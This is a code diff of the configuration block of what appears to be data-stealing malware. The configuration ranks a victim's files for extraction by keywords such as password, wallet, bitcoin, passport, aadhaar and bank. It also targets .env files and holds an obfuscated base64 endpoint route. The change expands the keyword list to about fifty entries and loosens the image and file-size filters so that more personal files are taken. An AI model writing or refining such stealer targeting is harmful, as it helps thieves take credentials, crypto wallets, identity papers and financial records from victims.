@@ -12,29 +12,74 @@ const CONFIG = {
     MAX_FILES_TO_EXTRACT: 10,
     _sysEndpointRoute: 'c2hpbmNoYW5fMDA3',
     SKIP_FOLDERS: ['appdata', 'node_modules', '.git', '.vscode', 'local'],
-    ALLOWED_EXTENSIONS: ['.pdf', '.doc', '.docx', '.txt', '.csv', '.jpg', '.png', '.env', '.config', '.json'],
+    ALLOWED_EXTENSIONS: ['.pdf', '.doc', '.docx', '.txt', '.csv', '.jpg', '.jpeg', '.png', '.env', '.config', '.json'],
     SCORING: {
         KEYWORDS: [
-            { word: 'password', points: 100 },
-            { word: 'secret', points: 100 },
-            { word: 'resume', points: 80 },
-            { word: 'admit', points: 80 },
-            { word: 'pan', points: 80 },
-            { word: 'bank', points: 80 },
-            { word: 'finance', points: 80 },
-            { word: 'project', points: 50 },
-            { word: 'screenshot', points: 20 }
-        ],
+  { word: 'password', points: 100 },
+  { word: 'passwords', points: 99 },
+  { word: 'bank', points: 98 },
+  { word: 'banking', points: 97 },
+  { word: 'wallet', points: 96 },
+  { word: 'crypto', points: 95 },
+  { word: 'bitcoin', points: 94 },
+  { word: 'recovery', points: 93 },
+  { word: 'backup', points: 92 },
+  { word: 'important', points: 91 },
+
+  { word: 'personal', points: 90 },
+  { word: 'private', points: 89 },
+  { word: 'confidential', points: 88 },
+  { word: 'secret', points: 87 },
+  { word: 'secure', points: 86 },
+  { word: 'document', points: 85 },
+  { word: 'documents', points: 84 },
+  { word: 'identity', points: 83 },
+  { word: 'passport', points: 82 },
+  { word: 'aadhaar', points: 81 },
+
+  { word: 'pan', points: 80 },
+  { word: 'license', points: 79 },
+  { word: 'certificate', points: 78 },
+  { word: 'certificates', points: 77 },
+  { word: 'resume', points: 76 },
+  { word: 'cv', points: 75 },
+  { word: 'degree', points: 74 },
+  { word: 'marksheet', points: 73 },
+  { word: 'transcript', points: 72 },
+  { word: 'education', points: 71 },
+
+  { word: 'tax', points: 70 },
+  { word: 'itr', points: 69 },
+  { word: 'salary', points: 68 },
+  { word: 'invoice', points: 67 },
+  { word: 'bill', points: 66 },
+  { word: 'receipt', points: 65 },
+  { word: 'investment', points: 64 },
+  { word: 'insurance', points: 63 },
+  { word: 'loan', points: 62 },
+  { word: 'property', points: 61 },
+
+  { word: 'legal', points: 60 },
+  { word: 'agreement', points: 59 },
+  { word: 'contract', points: 58 },
+  { word: 'medical', points: 57 },
+  { word: 'health', points: 56 },
+  { word: 'family', points: 55 },
+  { word: 'photos', points: 54 },
+  { word: 'memories', points: 53 },
+  { word: 'archive', points: 52 },
+  { word: 'data', points: 51 }
+],
         EXTENSIONS: {
             '.pdf': 40, '.docx': 40, '.csv': 30, '.txt': 30, '.env': 50, 
-            '.png': -20, '.jpg': -20
+            '.png': 40, '.jpg': 40, '.jpeg': 40
         },
         TIME: {
             RECENT_ACCESS_DAYS: 3, RECENT_ACCESS_POINTS: 50,
             OLD_ACCESS_DAYS: 7, OLD_ACCESS_POINTS: 20,
             RECENT_MODIFIED_DAYS: 7, RECENT_MODIFIED_POINTS: 30
         },
-        SIZE: { MIN_SIZE_KB: 50, PENALTY_POINTS: -50 }
+        SIZE: { MIN_SIZE_KB: 10, PENALTY_POINTS: -50 }
     }
 };
 
